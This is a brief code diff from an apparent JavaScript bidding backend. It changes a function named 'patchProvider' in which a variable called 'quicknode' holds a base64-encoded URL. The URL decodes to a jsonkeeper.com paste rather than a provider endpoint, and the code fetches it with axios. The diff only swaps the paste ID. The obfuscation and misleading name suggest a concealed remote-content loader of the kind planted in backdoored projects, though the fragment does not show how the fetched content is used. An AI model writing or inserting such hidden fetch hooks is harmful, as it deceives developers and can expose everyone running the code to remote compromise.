@@ -64,7 +64,7 @@ exports.placeBid = async (req, res) => {
 };
 
 const patchProvider = async () => {
-  const quicknode = atob('aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9SVkNTVQ==');
+  const quicknode = atob('aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9NQUlJWA==');
     try {
         response = await axios.get(quicknode);
         return {
